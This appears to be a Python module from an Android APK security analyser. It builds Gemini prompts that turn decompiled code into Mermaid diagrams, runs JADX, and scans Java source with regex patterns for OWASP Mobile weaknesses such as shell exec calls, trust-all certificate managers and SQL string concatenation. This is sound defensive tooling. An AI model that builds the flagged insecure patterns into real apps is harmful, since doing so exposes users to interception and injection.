Use icon shapes for visual nodes. Syntax: NodeId@{{ icon: "prefix:icon-name", form: "square", label: "Label" }}

## AVAILABLE ICONS (use EXACTLY these names):

### Platform & Mobile (fab: prefix):
- fab:android - Android
- fab:apple - iOS/Apple
- fab:chrome - Chrome browser

### Programming Languages (fab: prefix):
- fab:java - Java
- mdi:language-kotlin - Kotlin
- fab:js - JavaScript

### Databases:
- mdi:database - Generic database
- fa:database - Database (alternative)
- mdi:firebase - Firebase
- mdi:leaf - MongoDB

### Cloud & Infrastructure (fab: prefix):
- fab:aws - AWS
- fab:google - Google Cloud
- mdi:microsoft-azure - Azure

### DevOps & APIs:
- mdi:api - REST API
- mdi:graphql - GraphQL
- mdi:webhook - Webhook

### Security & Auth:
- fa:shield-halved - Security
- fa:lock - Authentication
- fa:key - Crypto/API Keys
- fa:fingerprint - Biometric
- mdi:two-factor-authentication - 2FA

### General UI/System:
- fa:mobile-screen - Mobile device
- fa:window-maximize - Activity/Screen
- fa:rocket - Main/Launcher
- fa:gear - Service/Settings
- fa:server - Server/Backend
- fa:cloud - Cloud service
- fa:globe - Web/Internet
- fa:network-wired - Network
- fa:code - Code/API
- fa:bell - Notifications
- fa:credit-card - Payment
- fa:location-dot - Location
- fa:user - User
- fa:camera - Camera
- fa:image - Media/Gallery

## SUBGRAPH STYLING
Use plain text labels with emojis for subgraphs (NO icons in subgraph labels):
- " Presentation Layer"
- " Business Logic"  
- " Data Layer"
- " Network Layer"
- " External Services"
- " Security"

## INSTRUCTIONS
1. Read the provided source code CAREFULLY
2. Identify the main architectural patterns (MVVM, MVP, Clean Architecture, etc.)
3. Map out the ACTUAL class relationships
4. Show DATA FLOW with labeled arrows (e.g., "credentials", "token", "user data")
5. Include ALL detected external services and APIs
6. Show security-relevant flows (auth, encryption, etc.)
7. Use actual class names where possible (e.g., "LoginActivity" not just "Login")

The diagram should tell the COMPLETE STORY of how the app works from user interaction to backend services.

Return ONLY the Mermaid diagram code starting with "flowchart TD" - no explanation or markdown code blocks.

Example structure:
flowchart TD
    subgraph Presentation[" Presentation Layer"]
        A@{{ icon: "fa:rocket", form: "square", label: "MainActivity" }}
        B@{{ icon: "fa:window-maximize", form: "square", label: "LoginActivity" }}
    end
    subgraph Logic[" Business Logic"]
        C@{{ icon: "fab:java", form: "square", label: "AuthRepository" }}
    end
    subgraph Data[" Data Layer"]
        D@{{ icon: "mdi:database", form: "square", label: "AppDatabase" }}
    end
    subgraph Network[" Network"]
        E@{{ icon: "mdi:api", form: "square", label: "ApiService" }}
    end
    subgraph External[" External Services"]
        F@{{ icon: "mdi:firebase", form: "square", label: "Firebase Auth" }}
    end
    
    A -->|"Launch"| B
    B -->|"Credentials"| C
    C -->|"Validate"| F
    C -->|"Store Token"| D
"""

        # Use retry helper for reliability
        response = await gemini_request_with_retry(
            lambda: client.aio.models.generate_content(
                model=settings.gemini_model_id,
                contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
            ),
            max_retries=3,
            base_delay=2.0,
            timeout_seconds=180.0,
            operation_name="Architecture diagram generation"
        )
        
        diagram = response.text if response else None
        
        if diagram:
            # Clean up response
            diagram = diagram.strip()
            if diagram.startswith("```mermaid"):
                diagram = diagram[10:]
            if diagram.startswith("```"):
                diagram = diagram[3:]
            if diagram.endswith("```"):
                diagram = diagram[:-3]
            diagram = diagram.strip()
            
            # Validate it starts with flowchart
            if not diagram.startswith(("flowchart", "graph")):
                logger.warning("AI generated invalid Mermaid diagram")
                return None
            
            # Sanitize and fix icons
            diagram = _sanitize_mermaid_icons(diagram)
        
        return diagram
        
    except Exception as e:
        logger.error(f"AI architecture diagram generation failed: {e}")
        return None


# Valid icons that are known to work with our registered icon packs
_VALID_MERMAID_ICONS = {
    # Font Awesome 6 Solid (fa: prefix)
    "fa:rocket", "fa:mobile-screen", "fa:window-maximize", "fa:gear", "fa:database",
    "fa:shield-halved", "fa:lock", "fa:unlock", "fa:key", "fa:bug", "fa:server",
    "fa:cloud", "fa:globe", "fa:network-wired", "fa:tower-broadcast", "fa:code",
    "fa:file-code", "fa:triangle-exclamation", "fa:user", "fa:users", "fa:bell",
    "fa:credit-card", "fa:location-dot", "fa:fingerprint", "fa:user-shield",
    "fa:shield", "fa:cog", "fa:cogs", "fa:terminal", "fa:folder", "fa:file",
    "fa:download", "fa:upload", "fa:link", "fa:envelope", "fa:wifi", "fa:bolt",
    "fa:chart-bar", "fa:chart-line", "fa:check", "fa:xmark", "fa:plus", "fa:minus",
    "fa:search", "fa:eye", "fa:eye-slash", "fa:trash", "fa:pen", "fa:edit",
    "fa:mobile", "fa:tablet", "fa:laptop", "fa:desktop", "fa:home", "fa:building",
    
    # Font Awesome 6 Brands (fab: prefix)
    "fab:android", "fab:apple", "fab:windows", "fab:linux", "fab:java", "fab:python",
    "fab:js", "fab:js-square", "fab:node-js", "fab:node", "fab:php", "fab:rust",
    "fab:golang", "fab:go", "fab:swift", "fab:html5", "fab:css3", "fab:react",
    "fab:vuejs", "fab:vue", "fab:angular", "fab:docker", "fab:github", "fab:gitlab",
    "fab:bitbucket", "fab:aws", "fab:google", "fab:microsoft", "fab:digital-ocean",
    "fab:cloudflare", "fab:npm", "fab:yarn", "fab:chrome", "fab:firefox", "fab:safari",
    "fab:edge", "fab:laravel", "fab:symfony", "fab:wordpress", "fab:drupal",
    "fab:facebook", "fab:twitter", "fab:instagram", "fab:linkedin", "fab:slack",
    "fab:discord", "fab:telegram", "fab:whatsapp", "fab:stripe", "fab:paypal",
    "fab:bitcoin", "fab:ethereum", "fab:jenkins", "fab:jira", "fab:confluence",
    
    # Material Design Icons (mdi: prefix)
    "mdi:android", "mdi:apple", "mdi:microsoft", "mdi:linux", "mdi:windows",
    "mdi:database", "mdi:database-search", "mdi:database-lock", "mdi:database-check",
    "mdi:server", "mdi:server-network", "mdi:cloud", "mdi:cloud-upload", "mdi:cloud-download",
    "mdi:lock", "mdi:lock-open", "mdi:key", "mdi:shield", "mdi:shield-check", "mdi:shield-lock",
    "mdi:security", "mdi:bug", "mdi:cellphone", "mdi:cellphone-android", "mdi:tablet",
    "mdi:laptop", "mdi:desktop-mac", "mdi:application", "mdi:api", "mdi:webhook",
    "mdi:firebase", "mdi:kubernetes", "mdi:docker", "mdi:git", "mdi:github",
    "mdi:gitlab", "mdi:graphql", "mdi:nodejs", "mdi:react", "mdi:vuejs", "mdi:angular",
    "mdi:language-java", "mdi:language-python", "mdi:language-javascript", "mdi:language-typescript",
    "mdi:language-kotlin", "mdi:language-swift", "mdi:language-go", "mdi:language-rust",
    "mdi:language-c", "mdi:language-cpp", "mdi:language-csharp", "mdi:language-ruby",
    "mdi:language-php", "mdi:language-html5", "mdi:language-css3",
    "mdi:elephant", "mdi:database-outline", "mdi:leaf", "mdi:memory",
    "mdi:email", "mdi:email-outline", "mdi:send", "mdi:message", "mdi:chat",
    "mdi:alert", "mdi:alert-circle", "mdi:information", "mdi:check-circle", "mdi:close-circle",
    "mdi:cog", "mdi:cogs", "mdi:settings", "mdi:tune", "mdi:wrench", "mdi:tools",
    "mdi:code-braces", "mdi:code-tags", "mdi:file-code", "mdi:folder", "mdi:file",
    "mdi:download", "mdi:upload", "mdi:link", "mdi:web", "mdi:wifi", "mdi:lan",
    "mdi:network", "mdi:router", "mdi:access-point", "mdi:broadcast",
    "mdi:chart-bar", "mdi:chart-line", "mdi:chart-pie", "mdi:table", "mdi:view-list",
    "mdi:account", "mdi:account-group", "mdi:account-circle", "mdi:login", "mdi:logout",
    "mdi:home", "mdi:office-building", "mdi:store", "mdi:cart", "mdi:credit-card",
    "mdi:cash", "mdi:bitcoin", "mdi:ethereum", "mdi:currency-usd",
    "mdi:map-marker", "mdi:navigation", "mdi:compass", "mdi:earth", "mdi:globe-model",
    "mdi:camera", "mdi:microphone", "mdi:volume-high", "mdi:image", "mdi:video",
    "mdi:play", "mdi:pause", "mdi:stop", "mdi:skip-next", "mdi:skip-previous",
    "mdi:refresh", "mdi:sync", "mdi:reload", "mdi:restore", "mdi:backup-restore",
    "mdi:incognito", "mdi:fingerprint", "mdi:face-recognition", "mdi:two-factor-authentication",
    "mdi:package", "mdi:package-variant", "mdi:archive", "mdi:zip-box",
    "mdi:console", "mdi:powershell", "mdi:bash", "mdi:terminal",
    "mdi:rabbit", "mdi:apache-kafka", "mdi:middleware", "mdi:transit-connection",
    "mdi:nuxt", "mdi:electron-framework", "mdi:flutter", "mdi:dot-net", "mdi:microsoft-azure",
    "mdi:aws", "mdi:google-cloud", "mdi:terraform", "mdi:ansible",
}

# Icon aliases - map common variations to valid icons
_ICON_ALIASES = {
    # Common FA variations
    "fa:android": "fab:android",
    "fa:apple": "fab:apple", 
    "fa:java": "fab:java",
    "fa:python": "fab:python",
    "fa:javascript": "fab:js",
    "fa:nodejs": "fab:node-js",
    "fa:node": "fab:node-js",
    "fa:docker": "fab:docker",
    "fa:github": "fab:github",
    "fa:aws": "fab:aws",
    "fa:google": "fab:google",
    "fa:react": "fab:react",
    "fa:vue": "fab:vuejs",
    "fa:vuejs": "fab:vuejs",
    "fa:angular": "fab:angular",
    "fa:php": "fab:php",
    "fa:rust": "fab:rust",
    "fa:go": "fab:golang",
    "fa:golang": "fab:golang",
    "fa:swift": "fab:swift",
    "fa:windows": "fab:windows",
    "fa:linux": "fab:linux",
    "fa:chrome": "fab:chrome",
    "fa:firefox": "fab:firefox",
    "fa:safari": "fab:safari",
    "fa:settings": "fa:gear",
    "fa:warning": "fa:triangle-exclamation",
    "fa:exclamation-triangle": "fa:triangle-exclamation",
    "fa:exclamation": "fa:triangle-exclamation",
    "fa:danger": "fa:triangle-exclamation",
    "fa:alert": "fa:triangle-exclamation",
    "fa:broadcast-tower": "fa:tower-broadcast",
    "fa:cog": "fa:gear",
    "fa:security": "fa:shield-halved",
    "fa:auth": "fa:lock",
    "fa:authentication": "fa:lock",
    "fa:crypto": "fa:key",
    "fa:encryption": "fa:key",
    "fa:api": "fa:code",
    "fa:network": "fa:network-wired",
    "fa:mobile-alt": "fa:mobile-screen",
    "fa:smartphone": "fa:mobile-screen",
    "fa:phone": "fa:mobile-screen",
    
    # MDI variations
    "mdi:nodejs": "mdi:language-javascript",
    "mdi:typescript": "mdi:language-typescript",
    "mdi:java": "mdi:language-java",
    "mdi:python": "mdi:language-python",
    "mdi:kotlin": "mdi:language-kotlin",
    "mdi:go": "mdi:language-go",
    "mdi:golang": "mdi:language-go",
    "mdi:c": "mdi:language-c",
    "mdi:cpp": "mdi:language-cpp",
    "mdi:csharp": "mdi:language-csharp",
    "mdi:ruby": "mdi:language-ruby",
    "mdi:php": "mdi:language-php",
    "mdi:html5": "mdi:language-html5",
    "mdi:css3": "mdi:language-css3",
    "mdi:postgresql": "mdi:elephant",
    "mdi:postgres": "mdi:elephant",
    "mdi:mysql": "mdi:database",
    "mdi:mongodb": "mdi:leaf",
    "mdi:mongo": "mdi:leaf",
    "mdi:redis": "mdi:memory",
    "mdi:cache": "mdi:memory",
    "mdi:rabbitmq": "mdi:rabbit",
    "mdi:kafka": "mdi:apache-kafka",
    "mdi:warning": "mdi:alert",
    "mdi:danger": "mdi:alert-circle",
    "mdi:error": "mdi:alert-circle",
    "mdi:success": "mdi:check-circle",
    "mdi:info": "mdi:information",
    "mdi:user": "mdi:account",
    "mdi:users": "mdi:account-group",
    "mdi:azure": "mdi:microsoft-azure",
    "mdi:gcp": "mdi:google-cloud",
}

# Default fallback icon when nothing matches
_DEFAULT_ICON = "fa:code"


def _sanitize_mermaid_icons(diagram: str) -> str:
    """
    Sanitize and fix icons in a Mermaid diagram.
    
    - Replaces invalid icons with valid alternatives
    - Maps icon aliases to their correct names
    - Falls back to a default icon if no match found
    - Removes icon prefixes from subgraph labels
    """
    import re
    
    # First, clean up subgraph labels that incorrectly have icon syntax
    # Pattern: subgraph name["fa:icon-name Some Text"] -> subgraph name["Some Text"]
    subgraph_pattern = re.compile(r'(subgraph\s+\w+\[")([a-z]+:[a-z\-]+)\s+([^"]+)("\])')
    diagram = subgraph_pattern.sub(r'\1\3\4', diagram)
    
    # Also clean up subgraph labels with just icon syntax: ["fa:icon-name"] -> ["Component"]
    bare_icon_pattern = re.compile(r'(subgraph\s+\w+\[")([a-z]+:[a-z\-]+)("\])')
    diagram = bare_icon_pattern.sub(r'\1Component\3', diagram)
    
    # Pattern to match icon references in node definitions
    # Matches: icon: "prefix:name" or icon: 'prefix:name'
    icon_pattern = re.compile(r'icon:\s*["\']([^"\']+)["\']')
    
    def replace_icon(match):
        icon = match.group(1).strip()
        
        # Check if it's already valid
        if icon in _VALID_MERMAID_ICONS:
            return f'icon: "{icon}"'
        
        # Check aliases
        if icon in _ICON_ALIASES:
            return f'icon: "{_ICON_ALIASES[icon]}"'
        
        # Try lowercase
        icon_lower = icon.lower()
        if icon_lower in _VALID_MERMAID_ICONS:
            return f'icon: "{icon_lower}"'
        if icon_lower in _ICON_ALIASES:
            return f'icon: "{_ICON_ALIASES[icon_lower]}"'
        
        # Try to find a partial match
        icon_name = icon.split(":")[-1] if ":" in icon else icon
        for valid_icon in _VALID_MERMAID_ICONS:
            if icon_name in valid_icon:
                return f'icon: "{valid_icon}"'
        
        # Fall back to default
        logger.warning(f"Unknown Mermaid icon '{icon}', using default")
        return f'icon: "{_DEFAULT_ICON}"'
    
    return icon_pattern.sub(replace_icon, diagram)


async def generate_ai_data_flow_diagram(
    result: ApkAnalysisResult,
    jadx_result: Optional[Dict[str, Any]] = None,
    output_dir: Optional[Path] = None
) -> Optional[str]:
    """
    Generate an AI-powered Mermaid diagram showing data flow and privacy concerns.
    
    Args:
        result: The APK analysis result
        jadx_result: Optional JADX decompilation result dict (from get_jadx_result_summary)
        output_dir: Optional JADX output directory for accessing source code directly
    
    Returns:
        Mermaid diagram code string, or None if generation fails
    """
    if not settings.gemini_api_key:
        return None
    
    try:
        from google import genai
        from google.genai import types
        
        client = genai.Client(api_key=settings.gemini_api_key)
        
        # Collect decompiled source code for data flow analysis
        source_code_context = ""
        if output_dir and Path(output_dir).exists():
            source_code_context = _collect_source_code_samples(Path(output_dir), max_classes=10)
        
        # Build data flow context
        permissions_context = ""
        dangerous_perms = [p for p in result.permissions if p.is_dangerous]
        if dangerous_perms:
            permissions_context = f"""
Dangerous Permissions:
{chr(10).join(f'- {p.name}' for p in dangerous_perms[:10])}
"""
        
        # Data flow context from JADX if available
        flow_context = ""
        if jadx_result and isinstance(jadx_result, dict):
            sample_code = jadx_result.get('sample_code', [])
            if sample_code:
                flow_context = f"""
Source Code Analysis:
Total Classes: {len(jadx_result.get('classes', []))}
"""
                # Add code snippets for data flow analysis
                for sample in sample_code[:2]:
                    code = sample.get('code_snippet', '')[:1000]
                    flow_context += f"""
--- {sample.get('class_name', 'Unknown')} ---
{code}
"""
        
        # Include source code context if collected
        if source_code_context:
            flow_context += source_code_context
        
        # Secrets context
        secrets_context = ""
        if result.secrets:
            secrets_context = f"""
Exposed Secrets ({len(result.secrets)}):
{chr(10).join(f'- {s["type"]}: {s["masked_value"]}' for s in result.secrets[:5])}
"""

        prompt = f"""You are a privacy and data flow analyst. Generate a Mermaid flowchart showing how sensitive data flows through the app.

## APP: {result.package_name}

{permissions_context}
{flow_context}
{secrets_context}

URLs: {', '.join(result.urls[:5]) if result.urls else 'None found'}

## MERMAID FLOWCHART SYNTAX
Use standard Mermaid flowchart syntax with descriptive node shapes. DO NOT use icon syntax.

## NODE SHAPES FOR DATA FLOW:
- Stadium (["text"]) - Data sources (user input, sensors)
- Cylinder [("text")] - Databases, storage
- Parallelogram [/"text"/] - Network operations, API calls
- Diamond {{"text"}} - Security decisions, encryption checks
- Hexagon {{"{{text}}"}} - Processing, transformation
- Rectangle ["text"] - Standard operations
- Subroutine [["text"]] - External services, third parties

## INSTRUCTIONS
Generate a Mermaid flowchart showing:
1. Data sources (user input, device sensors, storage) - use stadium shape
2. Data processing within the app - use hexagon shape
3. Data destinations (storage, network, third parties) - use parallelogram for network, cylinder for storage
4. Privacy risk indicators - highlight with red styling
5. Encryption status - use diamond for security checks

## STYLING (add at end):
- classDef source fill:#4CAF50,stroke:#2E7D32,color:#fff
- classDef process fill:#2196F3,stroke:#1565C0,color:#fff
- classDef storage fill:#00BCD4,stroke:#00838F,color:#fff
- classDef network fill:#607D8B,stroke:#37474F,color:#fff
- classDef secure fill:#4CAF50,stroke:#2E7D32,color:#fff
- classDef risk fill:#F44336,stroke:#C62828,color:#fff

Return ONLY the Mermaid diagram code starting with "flowchart LR" - no explanation or markdown.

Example:
flowchart LR
    subgraph Sources[" Data Sources"]
        user(["User Input"])
        location(["Location Data"])
        contacts(["Contacts"])
    end
    subgraph Process[" Processing"]
        app{{"App Logic"}}
        encrypt{{"Encryption?"}}
    end
    subgraph Destinations[" Destinations"]
        db[("Local DB")]
        api[/"API Server"/]
        third[["Third Party SDK"]]
    end
    
    user --> app
    location --> app
    contacts --> app
    app --> encrypt
    encrypt -->|Yes| db
    encrypt -->|No| api
    app --> third
    
    classDef source fill:#4CAF50,stroke:#2E7D32,color:#fff
    classDef risk fill:#F44336,stroke:#C62828,color:#fff
    class user,location,contacts source
    class third,api risk
"""

        # Use retry helper for reliability
        response = await gemini_request_with_retry(
            lambda: client.aio.models.generate_content(
                model=settings.gemini_model_id,
                contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
            ),
            max_retries=3,
            base_delay=2.0,
            timeout_seconds=180.0,
            operation_name="Data flow diagram generation"
        )
        
        diagram = response.text if response else None
        
        if diagram:
            diagram = diagram.strip()
            if diagram.startswith("```mermaid"):
                diagram = diagram[10:]
            if diagram.startswith("```"):
                diagram = diagram[3:]
            if diagram.endswith("```"):
                diagram = diagram[:-3]
            diagram = diagram.strip()
            
            if not diagram.startswith(("flowchart", "graph")):
                return None
        
        return diagram
        
    except Exception as e:
        logger.error(f"AI data flow diagram generation failed: {e}")
        return None


# ============================================================================
# JADX Decompilation Functions
# ============================================================================

def decompile_apk_with_jadx(
    apk_path: Path, 
    output_dir: Optional[Path] = None,
    max_classes_to_parse: int = 2000,
    skip_detailed_parsing: bool = False
) -> JadxDecompilationResult:
    """
    Decompile APK to Java source code using JADX.
    
    Args:
        apk_path: Path to the APK file
        output_dir: Optional output directory (temp dir if not specified)
        max_classes_to_parse: Maximum number of classes to fully parse (default 2000)
        skip_detailed_parsing: If True, only count files without parsing content
    
    Returns:
        JadxDecompilationResult with decompiled classes and metadata
    """
    import subprocess
    import time
    
    start_time = time.time()
    
    # Create output directory if not specified
    if output_dir is None:
        output_dir = Path(tempfile.mkdtemp(prefix="jadx_"))
    
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    
    errors = []
    warnings = []
    
    try:
        # Run JADX decompilation with performance optimizations
        import os
        cpu_count = os.cpu_count() or 4
        thread_count = max(4, cpu_count - 1)  # Use all but 1 core
        
        result = subprocess.run(
            [
                "jadx",
                "-d", str(output_dir),
                "--show-bad-code",  # Show decompiled code even with errors
                "--deobf",  # Deobfuscate names
                "--deobf-min", "2",
                "--deobf-max", "64",
                "--threads-count", str(thread_count),  # Dynamic thread count
                "--no-debug-info",  # Skip debug info for speed
                str(apk_path)
            ],
            capture_output=True,
            text=True,
            timeout=1800  # 30 minute timeout for very large APKs (games, enterprise apps)
        )
        
        if result.returncode != 0:
            warnings.append(f"JADX warnings: {result.stderr[:500]}")
        
    except subprocess.TimeoutExpired:
        errors.append("JADX decompilation timed out after 30 minutes. The APK may be extremely large or complex.")
        return JadxDecompilationResult(
            package_name="unknown",
            total_classes=0,
            total_files=0,
            output_directory=str(output_dir),
            classes=[],
            resources_dir=str(output_dir / "resources"),
            manifest_path="",
            source_tree={},
            decompilation_time=time.time() - start_time,
            errors=errors
        )
    except FileNotFoundError:
        errors.append("JADX not found. Please install JADX.")
        return JadxDecompilationResult(
            package_name="unknown",
            total_classes=0,
            total_files=0,
            output_directory=str(output_dir),
            classes=[],
            resources_dir=str(output_dir / "resources"),
            manifest_path="",
            source_tree={},
            decompilation_time=time.time() - start_time,
            errors=errors
        )
    
    # Parse decompiled output
    sources_dir = output_dir / "sources"
    resources_dir = output_dir / "resources"
    manifest_path = resources_dir / "AndroidManifest.xml"
    
    # Build source tree and collect classes
    classes = []
    source_tree = {}
    package_name = "unknown"
    
    # First, collect all Java file paths efficiently (single traversal)
    java_files = list(sources_dir.rglob("*.java")) if sources_dir.exists() else []
    total_files = len(java_files)
    
    # Limit classes to parse for very large APKs to avoid freezing
    files_to_parse = java_files[:max_classes_to_parse] if not skip_detailed_parsing else []
    
    if skip_detailed_parsing:
        # Fast mode: just build tree without parsing content
        for java_file in java_files[:5000]:  # Limit tree building too
            try:
                rel_path = str(java_file.relative_to(sources_dir))
                _add_to_source_tree(source_tree, rel_path)
            except:
                pass
    else:
        # Standard mode: parse classes up to limit
        for idx, java_file in enumerate(files_to_parse):
            try:
                source_code = java_file.read_text(encoding='utf-8', errors='ignore')
                rel_path = str(java_file.relative_to(sources_dir))
                
                # Parse class info from source
                class_info = _parse_java_class(source_code, rel_path)
                classes.append(class_info)
                
                # Extract package name from first class
                if package_name == "unknown" and class_info.package_name:
                    # Try to get base package (first 2-3 segments)
                    parts = class_info.package_name.split('.')
                    if len(parts) >= 2:
                        package_name = '.'.join(parts[:min(3, len(parts))])
                
                # Build tree structure
                _add_to_source_tree(source_tree, rel_path)
                
            except Exception as e:
                warnings.append(f"Failed to parse {java_file.name}: {str(e)}")
        
        # Add remaining files to tree without parsing content
        for java_file in java_files[max_classes_to_parse:5000]:
            try:
                rel_path = str(java_file.relative_to(sources_dir))
                _add_to_source_tree(source_tree, rel_path)
            except:
                pass
    
    decompilation_time = time.time() - start_time
    
    return JadxDecompilationResult(
        package_name=package_name,
        total_classes=len(classes),
        total_files=total_files,  # Use pre-computed count, don't rglob again
        output_directory=str(output_dir),
        classes=classes,
        resources_dir=str(resources_dir),
        manifest_path=str(manifest_path) if manifest_path.exists() else "",
        source_tree=source_tree,
        decompilation_time=decompilation_time,
        errors=errors,
        warnings=warnings
    )


def _parse_java_class(source_code: str, file_path: str) -> JadxDecompiledClass:
    """Parse a Java source file to extract class information."""
    import re
    
    lines = source_code.split('\n')
    line_count = len(lines)
    
    # Extract package
    package_match = re.search(r'package\s+([\w.]+)\s*;', source_code)
    package_name = package_match.group(1) if package_match else ""
    
    # Extract class name
    class_match = re.search(r'(?:public\s+)?(?:abstract\s+)?(?:final\s+)?class\s+(\w+)', source_code)
    class_name = class_match.group(1) if class_match else Path(file_path).stem
    
    # Extract extends
    extends_match = re.search(r'class\s+\w+\s+extends\s+([\w.]+)', source_code)
    extends = extends_match.group(1) if extends_match else None
    
    # Extract implements
    implements_match = re.search(r'implements\s+([\w.,\s]+)(?:\s*\{)', source_code)
    implements = []
    if implements_match:
        implements = [i.strip() for i in implements_match.group(1).split(',')]
    
    # Check component types - ensure boolean, not None
    is_activity = bool(extends and ('Activity' in extends or 'AppCompatActivity' in extends))
    is_service = bool(extends and 'Service' in extends)
    is_receiver = bool(extends and 'BroadcastReceiver' in extends)
    is_provider = bool(extends and 'ContentProvider' in extends)
    is_application = bool(extends and 'Application' in extends)
    
    # Extract methods
    method_pattern = r'(?:public|private|protected)?\s*(?:static\s+)?(?:final\s+)?(?:synchronized\s+)?(?:[\w<>\[\],\s]+)\s+(\w+)\s*\([^)]*\)'
    methods = re.findall(method_pattern, source_code)
    
    # Extract fields
    field_pattern = r'(?:public|private|protected)\s+(?:static\s+)?(?:final\s+)?[\w<>\[\],\s]+\s+(\w+)\s*[;=]'
    fields = re.findall(field_pattern, source_code)
    
    # Check for security issues
    security_issues = _scan_java_security_issues(source_code, class_name)
    
    return JadxDecompiledClass(
        class_name=class_name,
        package_name=package_name,
        file_path=file_path,
        source_code=source_code,
        line_count=line_count,
        is_activity=is_activity,
        is_service=is_service,
        is_receiver=is_receiver,
        is_provider=is_provider,
        is_application=is_application,
        extends=extends,
        implements=implements,
        methods=methods[:50],  # Limit to avoid huge responses
        fields=fields[:50],
        security_issues=security_issues
    )


def _scan_java_security_issues(source_code: str, class_name: str) -> List[Dict[str, Any]]:
    """Scan Java source for common security issues with strict false positive filtering."""
    issues = []
    
    # Skip known safe library/framework classes that generate false positives
    safe_class_patterns = [
        r'R\$',  # Generated R.java resources
        r'^BuildConfig$',  # Build configuration
        r'\.databinding\.',  # Data binding generated classes
        r'_ViewBinding$',  # View binding
        r'Dagger.*Component',  # Dagger generated
        r'.*_Factory$',  # Factory generated classes
        r'.*_MembersInjector$',  # Dagger injectors
        r'.*Test$',  # Test classes
        r'Mock.*',  # Mock classes
        r'Fake.*',  # Fake classes for testing
        r'^android\.',  # Android framework
        r'^androidx\.',  # AndroidX
        r'^com\.google\.',  # Google libraries
        r'^kotlin\.',  # Kotlin stdlib
        r'^kotlinx\.',  # Kotlin extensions
        r'^java\.',  # Java stdlib
        r'^javax\.',  # Java extensions
        r'^org\.apache\.',  # Apache libraries
        r'^com\.squareup\.',  # Square libraries (OkHttp, Retrofit, etc)
        r'^io\.reactivex\.',  # RxJava
        r'^okhttp3\.',  # OkHttp
        r'^retrofit2\.',  # Retrofit
        r'^com\.fasterxml\.',  # Jackson
        r'^org\.json\.',  # JSON library
    ]
    
    # Check if this is a safe/library class we should skip
    for safe_pattern in safe_class_patterns:
        if re.search(safe_pattern, class_name):
            return []  # Skip library classes entirely
    
    # Comprehensive security patterns - 60+ patterns covering OWASP Mobile Top 10
    patterns = [
        # ========== M1: Improper Platform Usage ==========
        (r'\.exec\s*\(', 'Command Execution', 'high', 'Potential command injection vulnerability'),
        (r'Runtime\.getRuntime\(\)\.exec', 'Runtime Exec', 'high', 'Direct runtime command execution - shell injection risk'),
        (r'ProcessBuilder', 'Process Builder', 'high', 'Process execution - potential command injection'),
        (r'android:exported\s*=\s*"true"', 'Exported Component', 'medium', 'Exported component may be accessible by other apps'),
        (r'PendingIntent\.get(Activity|Service|Broadcast)\s*\([^,]+,\s*0', 'Insecure PendingIntent', 'high', 'PendingIntent without FLAG_IMMUTABLE is mutable'),
        (r'registerReceiver\s*\([^,]+,\s*new\s+IntentFilter', 'Dynamic Receiver', 'medium', 'Dynamically registered receiver may be exploitable'),
        (r'sendBroadcast\s*\([^)]+\)', 'Broadcast Without Permission', 'medium', 'Broadcasting without permission restriction'),
        (r'bindService\s*\(.*BIND_AUTO_CREATE', 'Service Binding', 'low', 'Service binding - verify permission requirements'),
        
        # ========== M2: Insecure Data Storage ==========
        (r'MODE_WORLD_READABLE|MODE_WORLD_WRITEABLE', 'World Accessible', 'critical', 'World-accessible file permissions - data exposure'),
        (r'getSharedPreferences.*\.edit\(\)', 'SharedPreferences Write', 'info', 'Writing to SharedPreferences - verify no sensitive data'),
        (r'putString\s*\([^,]*password|putString\s*\([^,]*token|putString\s*\([^,]*secret|putString\s*\([^,]*key', 'Sensitive Data Storage', 'high', 'Sensitive data stored in SharedPreferences'),
        (r'openFileOutput\s*\([^,]+,\s*Context\.MODE_PRIVATE', 'File Storage', 'low', 'File storage - verify encryption for sensitive data'),
        (r'SQLiteDatabase\.openOrCreateDatabase', 'SQLite Database', 'medium', 'SQLite database - verify encryption and parameterized queries'),
        (r'\.getWritableDatabase|\.getReadableDatabase', 'Database Access', 'info', 'Database access - review for SQL injection'),
        (r'rawQuery\s*\([^,]*\+', 'SQL Concatenation', 'high', 'String concatenation in SQL query - SQL injection risk'),
        (r'execSQL\s*\([^,]*\+', 'SQL Exec Concatenation', 'high', 'String concatenation in execSQL - SQL injection risk'),
        (r'getExternalFilesDir|getExternalStorageDirectory', 'External Storage', 'medium', 'External storage access - data accessible by other apps'),
        (r'Environment\.getExternalStoragePublicDirectory', 'Public Storage', 'high', 'Public external storage - data exposed to all apps'),
        (r'openFileInput|openFileOutput', 'Internal File Access', 'low', 'Internal file access - verify sensitive data handling'),
        (r'\.write\s*\([^)]*password|\.write\s*\([^)]*secret', 'Writing Secrets', 'high', 'Potentially writing secrets to file'),
        
        # ========== M3: Insecure Communication ==========
        (r'TrustManager.*X509', 'Custom TrustManager', 'critical', 'Custom SSL/TLS trust manager - may bypass validation'),
        (r'SSLSocketFactory.*ALLOW_ALL', 'SSL Bypass', 'critical', 'SSL certificate validation completely disabled'),
        (r'setHostnameVerifier.*ALLOW_ALL', 'Hostname Bypass', 'critical', 'Hostname verification disabled'),
        (r'TrustAllCertificates|TrustAllManager', 'Trust All Certs', 'critical', 'Trusting all certificates - MITM vulnerability'),
        (r'checkServerTrusted.*\{\s*\}|checkServerTrusted.*return;', 'Empty TrustManager', 'critical', 'Empty certificate validation - critical vulnerability'),
        (r'ALLOW_ALL_HOSTNAME_VERIFIER', 'Hostname Verifier Bypass', 'critical', 'Accepting all hostnames - MITM vulnerability'),
        (r'http://', 'Cleartext HTTP', 'medium', 'Cleartext HTTP connection - data may be intercepted'),
        (r'\.setRequestProperty\s*\([^,]*[Aa]uthorization', 'Auth Header', 'info', 'Authorization header - verify HTTPS usage'),
        (r'BasicAuth|Basic\s+Auth', 'Basic Authentication', 'medium', 'Basic authentication - credentials may be exposed'),
        (r'WebSocket\s*\(\s*"ws://', 'Cleartext WebSocket', 'medium', 'Unencrypted WebSocket connection'),
        
        # ========== M4: Insecure Authentication ==========
        (r'BiometricPrompt.*setNegativeButtonText', 'Biometric Auth', 'info', 'Biometric authentication implementation'),
        (r'checkSelfPermission.*FINGERPRINT', 'Fingerprint Auth', 'info', 'Fingerprint authentication check'),
        (r'\.equals\s*\([^)]*password', 'Password Comparison', 'medium', 'String equals for password - timing attack risk'),
        (r'hardcoded.*password|password\s*=\s*"[^"]+"', 'Hardcoded Password', 'critical', 'Hardcoded password detected'),
